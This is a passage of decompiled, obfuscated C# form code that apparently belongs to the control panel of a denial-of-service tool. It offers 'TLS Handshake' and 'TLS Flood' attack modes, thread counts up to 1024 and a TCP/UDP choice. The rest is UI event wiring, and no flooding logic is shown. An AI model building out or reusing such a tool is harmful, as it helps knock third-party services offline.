        this.vmethod_10().Items.Add("TLS Handshake");
        this.vmethod_10().Items.Add("TLS Flood");
        this.vmethod_10().Items.Add("Custom");
        this.vmethod_10().SelectedItem = this.vmethod_10().Items[0];
        int item = 1;
        while (true)
        {
            this.vmethod_6().Items.Add(item);
            item++;
            if (item > 0x400)
            {
                this.vmethod_6().SelectedItem = this.vmethod_6().Items[0];
                this.vmethod_86().Items.Add("Maximum");
                this.vmethod_86().Items.Add("High");
                this.vmethod_86().Items.Add("Above normal");
                this.vmethod_86().Items.Add("Normal");
                this.vmethod_86().Items.Add("Below normal");
                this.vmethod_86().Items.Add("Low");
                this.vmethod_86().Items.Add("Minimum");
                this.vmethod_86().SelectedItem = this.vmethod_86().Items[1];
                this.vmethod_76().Items.Add("TCP");
                this.vmethod_76().Items.Add("UDP");
                this.vmethod_76().SelectedItem = this.vmethod_76().Items[0];
                this.vmethod_4().RunWorkerAsync();
                return;
            }
        }
    }

    private void method_9(object sender, DoWorkEventArgs e)
    {
        while (true)
        {
            this.method_3();
            this.method_4();
            this.method_5();
            Thread.Sleep(0x3e8);
        }
    }

    internal virtual VisualButton vmethod_0()
    {
        return this.visualButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(VisualButton visualButton_2)
    {
        EventHandler handler = new EventHandler(this.method_25);
        VisualButton button = this.visualButton_0;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_0 = visualButton_2;
        button = this.visualButton_0;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ComboBox vmethod_10()
    {
        return this.comboBox_1;
    }

    internal virtual OLVColumn vmethod_100()
    {
        return this.olvcolumn_10;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_101(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_10 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_102()
    {
        return this.olvcolumn_11;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_103(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_11 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_104()
    {
        return this.olvcolumn_12;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_105(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_12 = olvcolumn_13;
    }

    internal virtual ToolStripStatusLabel vmethod_106()
    {
        return this.toolStripStatusLabel_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_107(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_4 = toolStripStatusLabel_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_11(ComboBox comboBox_4)
    {
        EventHandler handler = new EventHandler(this.method_11);
        EventHandler handler2 = new EventHandler(this.method_12);
        ComboBox box = this.comboBox_1;
        if (box != null)
        {
            box.SelectedIndexChanged -= handler;
            box.SelectedValueChanged -= handler2;
        }
        this.comboBox_1 = comboBox_4;
        box = this.comboBox_1;
        if (box != null)
        {
            box.SelectedIndexChanged += handler;
            box.SelectedValueChanged += handler2;
        }
    }

    internal virtual Label vmethod_12()
    {
        return this.label_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_13(Label label_9)
    {
        this.label_1 = label_9;
    }

    internal virtual TextBox vmethod_14()
    {
        return this.textBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_15(TextBox textBox_4)
    {
        EventHandler handler = new EventHandler(this.method_17);
        EventHandler handler2 = new EventHandler(this.method_18);
        EventHandler handler3 = new EventHandler(this.method_19);
        TextBox box = this.textBox_0;
        if (box != null)
        {
            box.TextChanged -= handler;
            box.GotFocus -= handler2;
            box.LostFocus -= handler3;
        }
        this.textBox_0 = textBox_4;
        box = this.textBox_0;
        if (box != null)
        {
            box.TextChanged += handler;
            box.GotFocus += handler2;
            box.LostFocus += handler3;
        }
    }

    internal virtual Label vmethod_16()
    {
        return this.label_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_17(Label label_9)
    {
        this.label_2 = label_9;
    }

    internal virtual TextBox vmethod_18()
    {
        return this.textBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_19(TextBox textBox_4)
    {
        EventHandler handler = new EventHandler(this.method_15);
        EventHandler handler2 = new EventHandler(this.method_16);
        TextBox box = this.textBox_1;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
        }
        this.textBox_1 = textBox_4;
        box = this.textBox_1;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
        }
    }

    internal virtual VisualButton vmethod_2()
    {
        return this.visualButton_1;
    }

    internal virtual Label vmethod_20()
    {
        return this.label_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_21(Label label_9)
    {
        this.label_3 = label_9;
    }

    internal virtual RadioButton vmethod_22()
    {
        return this.radioButton_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_23(RadioButton radioButton_2)
    {
        this.radioButton_0 = radioButton_2;
    }

    internal virtual RadioButton vmethod_24()
    {
        return this.radioButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_25(RadioButton radioButton_2)
    {
        this.radioButton_1 = radioButton_2;
    }

    internal virtual Timer vmethod_26()
    {
        return this.timer_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_27(Timer timer_1)
    {
        EventHandler handler = new EventHandler(this.method_10);
        Timer timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick -= handler;
        }
        this.timer_0 = timer_1;
        timer = this.timer_0;
        if (timer != null)
        {
            timer.Tick += handler;
        }
    }

    internal virtual StatusStrip vmethod_28()
    {
        return this.statusStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_29(StatusStrip statusStrip_1)
    {
        this.statusStrip_0 = statusStrip_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_3(VisualButton visualButton_2)
    {
        EventHandler handler = new EventHandler(this.method_22);
        VisualButton button = this.visualButton_1;
        if (button != null)
        {
            button.Click -= handler;
        }
        this.visualButton_1 = visualButton_2;
        button = this.visualButton_1;
        if (button != null)
        {
            button.Click += handler;
        }
    }

    internal virtual ToolStripStatusLabel vmethod_30()
    {
        return this.toolStripStatusLabel_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_31(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_0 = toolStripStatusLabel_5;
    }

    internal virtual ToolStripStatusLabel vmethod_32()
    {
        return this.toolStripStatusLabel_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_33(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_1 = toolStripStatusLabel_5;
    }

    internal virtual ToolStripStatusLabel vmethod_34()
    {
        return this.toolStripStatusLabel_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_35(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_2 = toolStripStatusLabel_5;
    }

    internal virtual ToolStripStatusLabel vmethod_36()
    {
        return this.toolStripStatusLabel_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_37(ToolStripStatusLabel toolStripStatusLabel_5)
    {
        this.toolStripStatusLabel_3 = toolStripStatusLabel_5;
    }

    internal virtual FastObjectListView vmethod_38()
    {
        return this.fastObjectListView_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_39(FastObjectListView fastObjectListView_1)
    {
        EventHandler<FormatRowEventArgs> handler = new EventHandler<FormatRowEventArgs>(this.method_6);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_7);
        EventHandler handler3 = new EventHandler(this.method_26);
        FastObjectListView view = this.fastObjectListView_0;
        if (view != null)
        {
            view.remove_FormatRow(handler);
            view.KeyDown -= handler2;
            view.SelectedIndexChanged -= handler3;
        }
        this.fastObjectListView_0 = fastObjectListView_1;
        view = this.fastObjectListView_0;
        if (view != null)
        {
            view.add_FormatRow(handler);
            view.KeyDown += handler2;
            view.SelectedIndexChanged += handler3;
        }
    }

    internal virtual BackgroundWorker vmethod_4()
    {
        return this.backgroundWorker_0;
    }

    internal virtual OLVColumn vmethod_40()
    {
        return this.olvcolumn_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_41(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_0 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_42()
    {
        return this.olvcolumn_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_43(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_1 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_44()
    {
        return this.olvcolumn_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_45(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_2 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_46()
    {
        return this.olvcolumn_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_47(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_3 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_48()
    {
        return this.olvcolumn_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_49(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_4 = olvcolumn_13;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_5(BackgroundWorker backgroundWorker_1)
    {
        DoWorkEventHandler handler = new DoWorkEventHandler(this.method_9);
        BackgroundWorker worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork -= handler;
        }
        this.backgroundWorker_0 = backgroundWorker_1;
        worker = this.backgroundWorker_0;
        if (worker != null)
        {
            worker.DoWork += handler;
        }
    }

    internal virtual OLVColumn vmethod_50()
    {
        return this.olvcolumn_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_51(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_5 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_52()
    {
        return this.olvcolumn_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_53(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_6 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_54()
    {
        return this.olvcolumn_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_55(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_7 = olvcolumn_13;
    }

    internal virtual OLVColumn vmethod_56()
    {
        return this.olvcolumn_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_57(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_8 = olvcolumn_13;
    }

    internal virtual ContextMenuStrip vmethod_58()
    {
        return this.contextMenuStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_59(ContextMenuStrip contextMenuStrip_1)
    {
        this.contextMenuStrip_0 = contextMenuStrip_1;
    }

    internal virtual ComboBox vmethod_6()
    {
        return this.comboBox_0;
    }

    internal virtual ToolStripMenuItem vmethod_60()
    {
        return this.toolStripMenuItem_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_61(ToolStripMenuItem toolStripMenuItem_5)
    {
        this.toolStripMenuItem_0 = toolStripMenuItem_5;
    }

    internal virtual ToolStripMenuItem vmethod_62()
    {
        return this.toolStripMenuItem_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_63(ToolStripMenuItem toolStripMenuItem_5)
    {
        EventHandler handler = new EventHandler(this.method_27);
        ToolStripMenuItem item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_1 = toolStripMenuItem_5;
        item = this.toolStripMenuItem_1;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_64()
    {
        return this.toolStripSeparator_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_65(ToolStripSeparator toolStripSeparator_2)
    {
        this.toolStripSeparator_0 = toolStripSeparator_2;
    }

    internal virtual ToolStripMenuItem vmethod_66()
    {
        return this.toolStripMenuItem_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_67(ToolStripMenuItem toolStripMenuItem_5)
    {
        this.toolStripMenuItem_2 = toolStripMenuItem_5;
    }

    internal virtual ToolStripMenuItem vmethod_68()
    {
        return this.toolStripMenuItem_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_69(ToolStripMenuItem toolStripMenuItem_5)
    {
        EventHandler handler = new EventHandler(this.method_28);
        ToolStripMenuItem item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_3 = toolStripMenuItem_5;
        item = this.toolStripMenuItem_3;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_7(ComboBox comboBox_4)
    {
        this.comboBox_0 = comboBox_4;
    }

    internal virtual ToolStripSeparator vmethod_70()
    {
        return this.toolStripSeparator_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_71(ToolStripSeparator toolStripSeparator_2)
    {
        this.toolStripSeparator_1 = toolStripSeparator_2;
    }

    internal virtual ToolStripMenuItem vmethod_72()
    {
        return this.toolStripMenuItem_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_73(ToolStripMenuItem toolStripMenuItem_5)
    {
        EventHandler handler = new EventHandler(this.method_29);
        ToolStripMenuItem item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click -= handler;
        }
        this.toolStripMenuItem_4 = toolStripMenuItem_5;
        item = this.toolStripMenuItem_4;
        if (item != null)
        {
            item.Click += handler;
        }
    }

    internal virtual OLVColumn vmethod_74()
    {
        return this.olvcolumn_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_75(OLVColumn olvcolumn_13)
    {
        this.olvcolumn_9 = olvcolumn_13;
    }

    internal virtual ComboBox vmethod_76()
    {
        return this.comboBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_77(ComboBox comboBox_4)
    {
        this.comboBox_2 = comboBox_4;
    }

    internal virtual Label vmethod_78()
    {
        return this.label_4;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_79(Label label_9)
    {
        this.label_4 = label_9;
    }

    internal virtual Label vmethod_8()
    {
        return this.label_0;
    }

    internal virtual Label vmethod_80()
    {
        return this.label_5;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_81(Label label_9)
    {
        this.label_5 = label_9;
    }

    internal virtual TextBox vmethod_82()
    {
        return this.textBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_83(TextBox textBox_4)
    {
        EventHandler handler = new EventHandler(this.method_20);
        EventHandler handler2 = new EventHandler(this.method_21);
        TextBox box = this.textBox_2;
        if (box != null)
        {
            box.GotFocus -= handler;
            box.LostFocus -= handler2;
        }
        this.textBox_2 = textBox_4;
        box = this.textBox_2;
        if (box != null)
        {
            box.GotFocus += handler;
            box.LostFocus += handler2;
        }
    }

    internal virtual PictureBox vmethod_84()
    {
        return this.pictureBox_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_85(PictureBox pictureBox_3)
    {
        EventHandler handler = new EventHandler(this.method_13);
        PictureBox box = this.pictureBox_0;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_0 = pictureBox_3;
        box = this.pictureBox_0;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual ComboBox vmethod_86()
    {
        return this.comboBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_87(ComboBox comboBox_4)
    {
        this.comboBox_3 = comboBox_4;
    }

    internal virtual Label vmethod_88()
    {
        return this.label_6;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_89(Label label_9)
    {
        this.label_6 = label_9;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_9(Label label_9)
    {
        this.label_0 = label_9;
    }

    internal virtual PictureBox vmethod_90()
    {
        return this.pictureBox_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_91(PictureBox pictureBox_3)
    {
        EventHandler handler = new EventHandler(this.method_14);
        PictureBox box = this.pictureBox_1;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_1 = pictureBox_3;
        box = this.pictureBox_1;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    internal virtual Label vmethod_92()
    {
        return this.label_7;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_93(Label label_9)
    {
        this.label_7 = label_9;
    }

    internal virtual TextBox vmethod_94()
    {
        return this.textBox_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_95(TextBox textBox_4)
    {
        EventHandler handler = new EventHandler(this.method_23);
        TextBox box = this.textBox_3;
        if (box != null)
        {
            box.TextChanged -= handler;
        }
        this.textBox_3 = textBox_4;
        box = this.textBox_3;
        if (box != null)
        {
            box.TextChanged += handler;
        }
    }

    internal virtual Label vmethod_96()
    {
        return this.label_8;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_97(Label label_9)
    {
        this.label_8 = label_9;
    }

    internal virtual PictureBox vmethod_98()
    {
        return this.pictureBox_2;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_99(PictureBox pictureBox_3)
    {
        EventHandler handler = new EventHandler(this.method_24);
        PictureBox box = this.pictureBox_2;
        if (box != null)
        {
            box.Click -= handler;
        }
        this.pictureBox_2 = pictureBox_3;
        box = this.pictureBox_2;
        if (box != null)
        {
            box.Click += handler;
        }
    }

    private delegate void Delegate65();

    private delegate void Delegate66();

    private delegate void Delegate67();

    private delegate void Delegate68(string string_0);

    private delegate void Delegate69(string string_0, string string_1);

    private delegate void Delegate70(string string_0, string[] string_1);
}

